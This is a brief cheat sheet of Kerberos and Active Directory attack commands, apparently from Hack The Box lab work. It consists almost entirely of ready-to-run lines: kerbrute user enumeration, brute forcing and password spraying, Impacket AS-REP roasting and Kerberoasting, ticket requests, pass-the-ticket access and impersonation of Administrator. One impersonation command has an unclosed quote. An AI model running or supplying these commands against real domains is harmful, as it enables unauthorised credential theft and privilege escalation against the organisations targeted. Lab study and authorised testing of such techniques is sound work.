# Kerberos


## Sync time with the server 

    sudo ntpdate -d 10.10.10.161
    ntpdate FOREST.htb.local

## User enum

    kerbrute userenum -d Domain --dc 10.10.10.169 /usr/share/seclists/Usernames/cirt-default-usernames.txt


## Brute user

    kerbrute bruteuser -d Domain --dc 10.10.10.161 /usr/share/seclists/Passwords/darkweb2017-top1000.txt plop

## Password spraying 

    kerbrute passwordspray -d Domain --dc 10.10.10.161 username.lst Password123


## Impacket

### KRB_AS_REP Roasting

    GetNPUsers.py  Domain/ -usersfile userKerb -no-pass


### Kerberoasting

     GetUserSPNs.py -dc-ip 192.168.100.5 'Domain/Username:PASSWORD'  -request   

### Requesting tickets

    getST.py -dc-ip 192.168.100.5 -spn cifs/HOST.Domain 'Domain/Username:PASSWORD' 


> Using tickets

    export KRB5CCNAME=Username.ccache 

    smbclient.py Username@HOST.Domain -k -no-pass

### Impersonation tickets

getST.py -dc-ip 192.168.100.5 -spn cifs/HOST.Domain 'Domain/Username:PASSWORD -impersonate Administrator

### lookupsid


    lookupsid.py Domain/Username:PASSWORD@Target_IP